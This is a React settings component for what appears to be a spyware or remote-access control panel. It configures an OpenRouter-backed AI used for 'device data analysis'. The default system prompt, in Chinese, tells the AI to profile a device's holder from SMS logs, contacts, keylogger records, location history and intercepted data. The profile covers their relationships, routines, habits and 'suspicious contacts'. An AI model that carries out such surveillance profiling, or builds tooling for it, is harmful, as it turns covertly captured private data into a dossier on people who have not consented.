import { useEffect, useState } from "react"
import { api } from "../api/client"

function toast(m, t) {
  const e = document.createElement("div")
  e.style.cssText = "position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:99999;padding:12px 28px;border-radius:10px;font-size:14px;box-shadow:0 4px 20px rgba(0,0,0,.5);pointer-events:none;transition:opacity .3s"
  e.style.background = t === "error" ? "rgba(220,38,38,.9)" : "rgba(16,8,12,.95)"
  e.style.border = t === "error" ? "1px solid rgba(220,38,38,.3)" : "1px solid rgba(168,85,247,.12)"
  e.style.color = t === "error" ? "#ff7875" : "#e0d0d0"
  e.textContent = m
  document.body.appendChild(e)
  setTimeout(() => {
    e.style.opacity = "0"
    setTimeout(() => e.remove(), 300)
  }, 2500)
}

// ✅ 默认值：完全按图二预填（OpenRouter免费）
const DEFAULT_PROMPT = `你是一名专业的数据情报分析师。根据提供的设备数据（包括短信记录、通讯录、应用列表、键盘记录、定位历史、拦截数据等），对设备持有人进行全面的人像画像分析。
请从以下维度进行分析：
1. 基本画像：年龄段、性别推测、职业推测、所在地区
2. 社交关系：亲密联系人、家人朋友、同事关系
3. 行为习惯：作息规律、常用APP、兴趣爱好、消费习惯
4. 风险评估：是否存在敏感行为、是否接触敏感信息
5. 其他重要发现：可疑联系人、异常行为、重要线索等`

export default function AiConfig() {
  const [cfg, setCfg] = useState({
    api_url: "https://openrouter.ai/api/v1",
    model: "openrouter/free",
    temperature: 0.1,
    api_key: "",
    system_prompt: DEFAULT_PROMPT,
  })
  const [saving, setSaving] = useState(false)
  const [testing, setTesting] = useState(false)

  // 进入页面读取DB已保存的配置
  useEffect(() => {
    api.getAiConfig().then(r => {
      const d = r.data || r
      if (d && typeof d === "object") {
        const merged = { ...cfg, ...d }
        // temperature确保是数字
        if (merged.temperature !== undefined && merged.temperature !== null && merged.temperature !== "") {
          merged.temperature = parseFloat(merged.temperature) || 0.1
        }
        setCfg(merged)
      }
    }).catch(() => {})
  }, [])

  async function save() {
    if (!cfg.api_url || !cfg.model) return toast("请先填写 API URL 和 模型", "error")
    setSaving(true)
    try {
      await api.updateAiConfig({
        api_url: String(cfg.api_url || "").trim(),
        model: String(cfg.model || "").trim(),
        temperature: String(parseFloat(cfg.temperature) || 0.1),
        api_key: String(cfg.api_key || ""),
        system_prompt: String(cfg.system_prompt || ""),
      })
      toast("AI 配置已保存")
    } catch (e) { toast(e.message, "error") }
    finally { setSaving(false) }
  }

  async function test() {
    if (!cfg.api_url || !cfg.model) return toast("请先填写 API URL 和 模型", "error")
    setTesting(true)
    try {
      await api.testAiConfig({
        api_url: String(cfg.api_url || "").trim(),
        model: String(cfg.model || "").trim(),
        temperature: String(parseFloat(cfg.temperature) || 0.1),
        api_key: String(cfg.api_key || ""),
        system_prompt: String(cfg.system_prompt || ""),
      })
      toast("AI 接口测试成功！配置正确")
    } catch (e) { toast(e.message, "error") }
    finally { setTesting(false) }
  }

  return (
    <div className="panel" style={{ padding: 18, marginBottom: 16 }}>
      <h4 style={{ margin: "0 0 10px", fontSize: 15, fontWeight: 600, color: "#ddd" }}>AI配置</h4>
      <div style={{ fontSize: 12, color: "#6e7681", marginBottom: 14 }}>配置 AI 分析接口，保存后用于设备数据分析。</div>

      {/* ✅ 第一行三列：API URL | 模型 | Temperature */}
      <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr 120px", gap: 12, marginBottom: 12 }}>
        <label style={{ fontSize: 13, color: "#8870a0" }}>API URL
          <input value={cfg.api_url} onChange={e => setCfg({ ...cfg, api_url: e.target.value })} placeholder="https://openrouter.ai/api/v1"
            style={{ width: "100%", marginTop: 4, height: 36, background: "rgba(255,255,255,.04)", border: "1px solid rgba(168,85,247,.08)", borderRadius: 6, padding: "0 10px", color: "#ddd", fontSize: 13, outline: 0 }} />
        </label>
        <label style={{ fontSize: 13, color: "#8870a0" }}>模型
          <input value={cfg.model} onChange={e => setCfg({ ...cfg, model: e.target.value })} placeholder="openrouter/free"
            style={{ width: "100%", marginTop: 4, height: 36, background: "rgba(255,255,255,.04)", border: "1px solid rgba(168,85,247,.08)", borderRadius: 6, padding: "0 10px", color: "#ddd", fontSize: 13, outline: 0 }} />
        </label>
        <label style={{ fontSize: 13, color: "#8870a0" }}>Temperature
          <input value={cfg.temperature} onChange={e => setCfg({ ...cfg, temperature: e.target.value })} placeholder="0.1" step="0.1" min="0" max="2"
            style={{ width: "100%", marginTop: 4, height: 36, background: "rgba(255,255,255,.04)", border: "1px solid rgba(168,85,247,.08)", borderRadius: 6, padding: "0 10px", color: "#ddd", fontSize: 13, outline: 0 }} />
        </label>
      </div>

      {/* ✅ 第二行：API Key 占整行 */}
      <div style={{ marginBottom: 12 }}>
        <label style={{ fontSize: 13, color: "#8870a0" }}>API Key
          <input value={cfg.api_key} onChange={e => setCfg({ ...cfg, api_key: e.target.value })} placeholder="留空则保留已保存的 Key" type="password"
            style={{ width: "100%", marginTop: 4, height: 36, background: "rgba(255,255,255,.04)", border: "1px solid rgba(168,85,247,.08)", borderRadius: 6, padding: "0 10px", color: "#ddd", fontSize: 13, outline: 0 }} />
        </label>
      </div>

      {/* ✅ 第三行：系统提示词 textarea 多行 */}
      <div style={{ marginBottom: 14 }}>
        <label style={{ fontSize: 13, color: "#8870a0" }}>系统提示词
          <textarea value={cfg.system_prompt} onChange={e => setCfg({ ...cfg, system_prompt: e.target.value })} rows={10}
            style={{ width: "100%", marginTop: 4, resize: "vertical", lineHeight: 1.6, background: "rgba(255,255,255,.04)", border: "1px solid rgba(168,85,247,.08)", borderRadius: 6, padding: "8px 10px", color: "#ddd", fontSize: 13, outline: 0, fontFamily: "inherit" }} />
        </label>
      </div>

      {/* ✅ 按钮行：保存AI配置 / 测试接口 */}
      <div style={{ display: "flex", gap: 10 }}>
        <button className="rc-btn" onClick={save} disabled={saving} style={{ height: 34 }}>{saving ? "保存中..." : "保存 AI 配置"}</button>
        <button className="rc-btn" onClick={test} disabled={testing} style={{ height: 34, background: "rgba(82,196,26,.12)", color: "#52c41a" }}>{testing ? "测试中..." : "测试接口"}</button>
      </div>
    </div>
  )
}
